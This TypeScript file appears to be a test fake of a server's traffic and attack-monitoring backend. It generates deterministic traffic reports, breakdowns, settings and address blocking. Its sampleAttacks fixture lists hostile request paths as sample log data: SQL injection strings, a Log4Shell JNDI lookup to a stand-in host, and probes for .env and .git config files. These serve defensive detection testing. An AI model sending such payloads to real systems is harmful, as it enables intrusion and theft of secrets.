import type {
  AttackEventInfo,
  AttackQuery,
  AttackSettings,
  AttackSummary,
  AutoBlockSettings,
  BlockAddressRequest,
  BlockAddressResult,
  BlockedAddressInfo,
  TrafficBreakdown,
  TrafficCount,
  TrafficDimension,
  TrafficDimensionPage,
  TrafficDimensionRequest,
  TrafficGranularity,
  TrafficLive,
  TrafficPoint,
  TrafficReport,
  TrafficReportRequest,
  TrafficSaveResult,
  TrafficSettings,
  TrafficStatus,
  TrafficTotals,
} from '../protocol/generated/Runova.ServerCore.Contracts';
import {
  checkAttackSettings,
  checkAutoBlock,
  checkNetwork,
  checkTrafficSettings,
  DEFAULT_THRESHOLDS,
} from '../trafficValidation';

/**
 * Website traffic and attacks on the pretend server (E109, E110). Values follow the real core's
 * conventions: browsers without a version, devices as Desktop, Mobile and Tablet, cities as
 * "City, CC", T1 for Tor, XX for unknown and "Other" for values past the ones kept. Reports are made up but follow
 * the shape of real traffic (a daily curve, quieter weekends, a long tail of pages, more desktop
 * than mobile) and are the same for the same request, so tests can count on them. Everything adds
 * up: the series sums to the totals, and each breakdown to what it is a share of. Settings are
 * checked with the same rules the form uses, as the core checks them.
 */

const HOUR = 3_600_000;
const DAY = 86_400_000;

/** Weighted values for each breakdown, most common first. */
const DIMENSIONS: Record<TrafficDimension, ReadonlyArray<readonly [string, number]>> = {
  page: [
    ['/', 30],
    ['/pricing', 12],
    ['/blog/how-we-cut-our-cloud-bill', 9],
    ['/docs/getting-started', 8],
    ['/about', 5],
    ['/blog/postgres-backups-that-work', 4],
    ['/contact', 3],
    ['/changelog', 3],
    ['/docs/deploy', 2],
    ['/careers', 1],
  ],
  entryPage: [
    ['/', 46],
    ['/blog/how-we-cut-our-cloud-bill', 16],
    ['/pricing', 11],
    ['/docs/getting-started', 9],
    ['/blog/postgres-backups-that-work', 6],
    ['/about', 3],
  ],
  referrer: [
    ['google.com', 31],
    ['news.ycombinator.com', 9],
    ['github.com', 6],
    ['duckduckgo.com', 4],
    ['bing.com', 3],
    ['x.com', 2],
    ['reddit.com', 2],
  ],
  browser: [
    ['Chrome', 46],
    ['Safari', 21],
    ['Firefox', 10],
    ['Edge', 9],
    ['Samsung Internet', 4],
    ['Opera', 2],
  ],
  operatingSystem: [
    ['Windows', 34],
    ['macOS', 22],
    ['iOS', 19],
    ['Android', 17],
    ['Linux', 6],
    ['ChromeOS', 1],
  ],
  device: [
    ['Desktop', 61],
    ['Mobile', 34],
    ['Tablet', 5],
  ],
  country: [
    ['US', 31],
    ['DE', 12],
    ['GB', 9],
    ['IN', 8],
    ['FR', 6],
    ['CA', 5],
    ['NL', 4],
    ['BR', 4],
    ['JP', 3],
    ['IR', 3],
    ['AU', 2],
    ['SE', 2],
    ['T1', 0.6],
    ['XX', 1],
    ['Other', 0.8],
  ],
  city: [
    ['New York, US', 9],
    ['Berlin, DE', 7],
    ['London, GB', 6],
    ['Toronto, CA', 3],
    ['Amsterdam, NL', 3],
    ['Mumbai, IN', 3],
  ],
  statusCode: [
    ['200', 82],
    ['304', 8],
    ['404', 4],
    ['301', 3],
    ['403', 1],
    ['500', 0.4],
  ],
  bot: [
    ['Googlebot', 34],
    ['Bingbot', 18],
    ['AhrefsBot', 14],
    ['GPTBot', 11],
    ['facebookexternalhit', 6],
    ['Applebot', 4],
  ],
};

/** "See all" has more than the top 50: a tail of blog posts behind the pages. */
function fullList(dimension: TrafficDimension): ReadonlyArray<readonly [string, number]> {
  if (dimension !== 'page') return DIMENSIONS[dimension];
  const tail = Array.from(
    { length: 80 },
    (_, i) => [`/blog/post-${i + 1}`, 0.9 / (i + 1)] as const,
  );
  return [...DIMENSIONS.page, ...tail];
}

/** A number from 0 to 1 that depends only on the seed. */
function noise(seed: number): number {
  let x = Math.imul(seed ^ 0x9e3779b9, 0x85ebca6b);
  x ^= x >>> 13;
  x = Math.imul(x, 0xc2b2ae35);
  x ^= x >>> 16;
  return (x >>> 0) / 2 ** 32;
}

function salt(siteId: string | undefined): number {
  let hash = 7;
  for (const char of siteId ?? '*') hash = (hash * 31 + char.charCodeAt(0)) | 0;
  return hash;
}

function scale(siteId: string | undefined): number {
  return siteId === undefined ? 1 : 0.35 + noise(salt(siteId)) * 0.5;
}

/** Page views in one hour: busy afternoons, quiet nights, softer weekends. */
function hourlyPageViews(start: number, siteId: string | undefined): number {
  const date = new Date(start);
  const hour = date.getUTCHours();
  const weekend = date.getUTCDay() === 0 || date.getUTCDay() === 6;
  const curve = 0.18 + Math.max(0, Math.sin(((hour - 6) / 24) * 2 * Math.PI)) * 0.95;
  const wobble = 0.8 + noise(Math.floor(start / HOUR) ^ salt(siteId)) * 0.4;
  return Math.round(140 * scale(siteId) * curve * wobble * (weekend ? 0.68 : 1));
}

/** Where each bucket starts: hours, days, weeks from Monday, calendar months (UTC). */
export function trafficBuckets(
  from: number,
  to: number,
  granularity: TrafficGranularity,
): number[] {
  const starts: number[] = [];
  const first = new Date(from);
  let at: number;
  if (granularity === 'hour') at = Math.floor(from / HOUR) * HOUR;
  else if (granularity === 'day') at = Math.floor(from / DAY) * DAY;
  else if (granularity === 'week') {
    const day = Math.floor(from / DAY) * DAY;
    at = day - ((new Date(day).getUTCDay() + 6) % 7) * DAY;
  } else at = Date.UTC(first.getUTCFullYear(), first.getUTCMonth(), 1);
  while (at < to) {
    starts.push(at);
    if (granularity === 'hour') at += HOUR;
    else if (granularity === 'day') at += DAY;
    else if (granularity === 'week') at += 7 * DAY;
    else {
      const next = new Date(at);
      at = Date.UTC(next.getUTCFullYear(), next.getUTCMonth() + 1, 1);
    }
  }
  return starts;
}

function pointFrom(start: number, pageViews: number): TrafficPoint {
  const visits = Math.round(pageViews / 2.9);
  const requests = Math.round(pageViews * 4.2);
  return {
    startUnixMs: start,
    visitors: Math.round(visits * 0.78),
    visits,
    pageViews,
    requests,
    botRequests: Math.round(requests * 0.22),
    bytes: requests * 48_000,
    status4xx: Math.round(requests * 0.035),
    status5xx: Math.round(requests * 0.004),
  };
}

function series(
  from: number,
  to: number,
  granularity: TrafficGranularity,
  siteId: string | undefined,
  factor: number,
): TrafficPoint[] {
  const starts = trafficBuckets(from, to, granularity);
  return starts.map((start, index) => {
    const end = Math.min(starts[index + 1] ?? to, to);
    let views = 0;
    for (let hour = Math.max(start, Math.floor(from / HOUR) * HOUR); hour < end; hour += HOUR) {
      views += hourlyPageViews(hour, siteId);
    }
    return pointFrom(start, Math.round(views * factor));
  });
}

function totalsOf(points: TrafficPoint[]): TrafficTotals {
  const sum = (pick: (point: TrafficPoint) => number) =>
    points.reduce((total, point) => total + pick(point), 0);
  const visits = sum((point) => point.visits);
  const requests = sum((point) => point.requests);
  const status3xx = Math.round(requests * 0.06);
  const status4xx = sum((point) => point.status4xx);
  const status5xx = sum((point) => point.status5xx);
  return {
    // People come back, so fewer are unique over the range than in each bucket added up.
    visitors: Math.round(sum((point) => point.visitors) * 0.7),
    visits,
    pageViews: sum((point) => point.pageViews),
    requests,
    botRequests: sum((point) => point.botRequests),
    bytes: sum((point) => point.bytes),
    bounces: Math.round(visits * 0.42),
    visitSeconds: visits * 134,
    status2xx: Math.max(0, requests - status3xx - status4xx - status5xx),
    status3xx,
    status4xx,
    status5xx,
    averageResponseMs: requests > 0 ? 38.5 : 0,
    p95ResponseMs: requests > 0 ? 212 : 0,
  };
}

/** Shares a total out by weight, the rounding left on the first value. */
function spread(values: ReadonlyArray<readonly [string, number]>, total: number): TrafficCount[] {
  if (total <= 0) return [];
  const weight = values.reduce((sum, [, w]) => sum + w, 0);
  const counts = values.map(([value, w]) => ({ value, count: Math.floor((total * w) / weight) }));
  counts[0].count += total - counts.reduce((sum, item) => sum + item.count, 0);
  return counts.filter((item) => item.count > 0);
}

function breakdownTotal(dimension: TrafficDimension, totals: TrafficTotals): number {
  if (dimension === 'entryPage') return totals.visits;
  if (dimension === 'statusCode') return totals.requests;
  if (dimension === 'bot') return totals.botRequests;
  if (dimension === 'city') return Math.round(totals.pageViews * 0.31);
  return totals.pageViews;
}

function hourOfWeek(pageViews: number): number[] {
  const weights = Array.from({ length: 168 }, (_, index) => {
    const day = Math.floor(index / 24);
    const hour = index % 24;
    const curve = 0.12 + Math.max(0, Math.sin(((hour - 6) / 24) * 2 * Math.PI));
    return curve * (day >= 5 ? 0.65 : 1);
  });
  const sum = weights.reduce((total, w) => total + w, 0);
  return weights.map((w) => Math.round((pageViews * w) / sum));
}

const EMPTY_TOTALS = totalsOf([]);

/** A report as the core would give one; `empty` for a server that has counted nothing yet. */
export function fakeTrafficReport(
  request: TrafficReportRequest,
  options: { empty?: boolean; enabled?: boolean; timeZone?: string } = {},
): TrafficReport {
  const factor = options.empty ? 0 : 1;
  const points = series(
    request.fromUnixMs,
    request.toUnixMs,
    request.granularity,
    request.siteId,
    factor,
  );
  const totals = totalsOf(points);
  const span = request.toUnixMs - request.fromUnixMs;
  const report: TrafficReport = {
    ...(request.siteId ? { siteId: request.siteId } : {}),
    fromUnixMs: request.fromUnixMs,
    toUnixMs: request.toUnixMs,
    granularity: request.granularity,
    timeZone: options.timeZone ?? 'UTC',
    totals,
    series: points,
    breakdowns: (Object.keys(DIMENSIONS) as TrafficDimension[]).map(
      (dimension): TrafficBreakdown => {
        const total = breakdownTotal(dimension, totals);
        return { dimension, top: spread(DIMENSIONS[dimension], total).slice(0, 50), total };
      },
    ),
    hourOfWeek: hourOfWeek(totals.pageViews),
    countrySources: {
      cloudflare: Math.round(totals.pageViews * 0.82),
      dbIp: totals.pageViews - Math.round(totals.pageViews * 0.82),
      unknown: 0,
    },
    enabled: options.enabled ?? true,
    collectingSinceUnixMs: request.fromUnixMs - 400 * DAY,
  };
  if (request.compare) {
    const previous = series(
      request.fromUnixMs - span,
      request.fromUnixMs,
      request.granularity,
      request.siteId,
      factor * 0.86,
    );
    const aligned = points.map(
      (point, index) => previous[index] ?? pointFrom(point.startUnixMs - span, 0),
    );
    report.previous = totalsOf(aligned);
    report.previousSeries = aligned;
  }
  return report;
}

export interface FakeTrafficSite {
  siteId: string;
  domains: string[];
}

export class FakeTraffic {
  settings: TrafficSettings = {
    enabled: false,
    countries: true,
    excludedSites: [],
    hourlyRetentionDays: 90,
    dailyRetentionDays: 730,
    timeZone: 'UTC',
    readExistingLogs: false,
  };
  attackSettings: AttackSettings = {
    enabled: true,
    thresholds: { ...DEFAULT_THRESHOLDS },
    allowlist: [],
    eventRetentionDays: 30,
  };
  autoBlock: AutoBlockSettings = {
    enabled: false,
    kinds: ['scan', 'bruteForce'],
    minutes: 60,
    maxBlocked: 1000,
  };
  /** Sites whose snippet turns access_log off. */
  loggingOff = new Set<string>();
  /** What `deleteData` was asked to delete, `*` for every site. */
  readonly deleted: string[] = [];
  /** While true every report is empty, as on a server that has counted nothing yet. */
  empty = false;
  geoDatabaseReady = true;
  blocks: BlockedAddressInfo[] = [];
  private nextBlockId = 1;
  private changed: { at: number; by: string } | null = null;

  constructor(
    private readonly deps: {
      now: () => number;
      userName: () => string;
      sites: () => FakeTrafficSite[];
    },
  ) {}

  status(): TrafficStatus {
    return {
      settings: { ...this.settings, excludedSites: [...this.settings.excludedSites] },
      attacks: {
        ...this.attackSettings,
        thresholds: { ...this.attackSettings.thresholds },
        allowlist: [...this.attackSettings.allowlist],
      },
      autoBlock: { ...this.autoBlock, kinds: [...this.autoBlock.kinds] },
      sites: this.deps.sites().map((site) => ({
        siteId: site.siteId,
        domains: [...site.domains],
        excluded: this.settings.excludedSites.includes(site.siteId),
        loggingOff: this.loggingOff.has(site.siteId),
        ...(this.settings.enabled ? { lastLineAtUnixMs: this.deps.now() - 4000 } : {}),
      })),
      geoDatabaseReady: this.geoDatabaseReady,
      storageBytes: 12_582_912,
      defaultTimeZone: 'UTC',
      ...(this.settings.enabled ? { collectingSinceUnixMs: this.deps.now() - 400 * DAY } : {}),
      ...(this.geoDatabaseReady
        ? { geoDatabaseUpdatedAtUnixMs: this.deps.now() - 3 * DAY }
        : { geoDatabaseProblem: 'The country database has not been downloaded yet.' }),
      ...(this.changed ? { changedAtUnixMs: this.changed.at, changedBy: this.changed.by } : {}),
    };
  }

  report(request: TrafficReportRequest): TrafficReport {
    const gone =
      this.deleted.includes('*') ||
      (request.siteId !== undefined && this.deleted.includes(request.siteId));
    return fakeTrafficReport(request, {
      empty: this.empty || gone,
      enabled: this.settings.enabled,
      timeZone: this.settings.timeZone,
    });
  }

  dimension(request: TrafficDimensionRequest): TrafficDimensionPage {
    const report = this.report({
      ...request,
      granularity: 'day',
      compare: false,
    });
    const total = breakdownTotal(request.dimension, report.totals);
    const search = request.search?.toLowerCase();
    const all = spread(fullList(request.dimension), total).filter(
      (item) => !search || item.value.toLowerCase().includes(search),
    );
    return {
      dimension: request.dimension,
      items: all.slice(request.offset, request.offset + request.limit),
      total,
      totalItems: all.length,
    };
  }

  live(siteId: string | undefined): TrafficLive {
    return {
      atUnixMs: this.deps.now(),
      visitorsNow: siteId ? 4 : 11,
      requestsLastMinute: siteId ? 38 : 112,
      pagesNow: [
        { value: '/', count: 5 },
        { value: '/pricing', count: 3 },
      ],
    };
  }

  saveSettings(settings: TrafficSettings): TrafficSaveResult {
    const problems = checkTrafficSettings(settings);
    if (problems.length > 0) return { problems };
    this.settings = {
      ...settings,
      excludedSites: [...settings.excludedSites],
      readExistingLogs: false,
    };
    this.touch();
    return { problems: [], status: this.status() };
  }

  deleteData(siteId: string | null): TrafficStatus {
    this.deleted.push(siteId ?? '*');
    this.touch();
    return this.status();
  }

  saveAttackSettings(settings: AttackSettings): TrafficSaveResult {
    const problems = checkAttackSettings(settings);
    if (problems.length > 0) return { problems };
    this.attackSettings = {
      ...settings,
      thresholds: { ...settings.thresholds },
      allowlist: settings.allowlist.map((entry) => entry.trim().toLowerCase()),
    };
    this.touch();
    return { problems: [], status: this.status() };
  }

  saveAutoBlock(settings: AutoBlockSettings): TrafficSaveResult {
    const problems = checkAutoBlock(settings);
    if (problems.length > 0) return { problems };
    this.autoBlock = { ...settings, kinds: [...settings.kinds] };
    this.touch();
    return { problems: [], status: this.status() };
  }

  attacks(query: AttackQuery): AttackSummary {
    const now = this.deps.now();
    const from = query.fromUnixMs ?? now - 7 * DAY;
    const to = query.toUnixMs ?? now;
    const blocked = new Set(this.blocks.map((block) => block.network));
    const events = sampleAttacks(now)
      .filter((event) => !query.siteId || event.siteId === query.siteId)
      .filter((event) => event.lastSeenAtUnixMs >= from && event.firstSeenAtUnixMs < to)
      .map((event) => ({ ...event, blocked: blocked.has(event.address) }))
      .slice(0, query.limit);
    const byDay = to - from > 3 * DAY;
    const step = byDay ? DAY : HOUR;
    const series = [];
    for (let at = Math.floor(from / step) * step; at < to; at += step) {
      const seed = Math.floor(at / step) ^ salt(query.siteId);
      series.push({
        startUnixMs: at,
        scan: Math.round(noise(seed) * (byDay ? 40 : 4)),
        bruteForce: Math.round(noise(seed + 1) * (byDay ? 16 : 2)),
        flood: noise(seed + 2) > 0.85 ? 1 : 0,
        injection: Math.round(noise(seed + 3) * (byDay ? 6 : 1)),
      });
    }
    return {
      events,
      series,
      addresses: new Set(events.map((event) => event.address)).size,
      blocked: events.filter((event) => event.blocked).length,
    };
  }

  blocked(): BlockedAddressInfo[] {
    return this.blocks.map((block) => ({ ...block }));
  }

  block(request: BlockAddressRequest): BlockAddressResult {
    const network = checkNetwork(request.network);
    if (!network.ok) return { problems: [network.reason] };
    if (this.blocks.some((block) => block.network === network.value)) {
      return { problems: [`${network.value} is already blocked.`] };
    }
    const now = this.deps.now();
    const block: BlockedAddressInfo = {
      id: this.nextBlockId++,
      network: network.value,
      reason: request.reason?.trim() || 'Blocked by hand',
      automatic: false,
      createdAtUnixMs: now,
      createdBy: this.deps.userName(),
      ...(request.siteId ? { siteId: request.siteId } : {}),
      ...(request.minutes ? { expiresAtUnixMs: now + request.minutes * 60_000 } : {}),
    };
    this.blocks.push(block);
    return { problems: [], blocked: { ...block } };
  }

  unblock(blockId: number): void {
    const index = this.blocks.findIndex((block) => block.id === blockId);
    if (index < 0) throw new Error('That address is not blocked any more.');
    this.blocks.splice(index, 1);
  }

  private touch(): void {
    this.changed = { at: this.deps.now(), by: this.deps.userName() };
  }
}

/** Four attacks of the last day, one of each kind, as the core's attack log would hold them. */
export function sampleAttacks(now: number): AttackEventInfo[] {
  return [
    {
      id: 41,
      siteId: 'blog',
      kind: 'scan',
      address: '198.51.100.23',
      firstSeenAtUnixMs: now - 3 * HOUR,
      lastSeenAtUnixMs: now - 2 * 60_000,
      count: 412,
      samplePaths: ['/.env', '/.git/config', '/wp-config.php.bak', '/phpmyadmin/'],
      blocked: false,
      country: 'NL',
    },
    {
      id: 40,
      siteId: 'shop',
      kind: 'bruteForce',
      address: '203.0.113.45',
      firstSeenAtUnixMs: now - 6 * HOUR,
      lastSeenAtUnixMs: now - 40 * 60_000,
      count: 238,
      samplePaths: ['/wp-login.php', '/xmlrpc.php'],
      blocked: false,
      country: 'RU',
    },
    {
      id: 39,
      siteId: 'blog',
      kind: 'injection',
      address: '192.0.2.77',
      firstSeenAtUnixMs: now - 9 * HOUR,
      lastSeenAtUnixMs: now - 8 * HOUR,
      count: 17,
      samplePaths: ["/search?q=' OR 1=1--", '/?id=1 UNION SELECT', '/${jndi:ldap://x.example/a}'],
      blocked: false,
      country: 'CN',
    },
    {
      id: 38,
      siteId: 'shop',
      kind: 'flood',
      address: '2001:db8:85a3::8a2e:370:7334',
      firstSeenAtUnixMs: now - 20 * HOUR,
      lastSeenAtUnixMs: now - 19 * HOUR,
      count: 9120,
      samplePaths: ['/'],
      blocked: false,
    },
  ];
}

export { EMPTY_TOTALS };
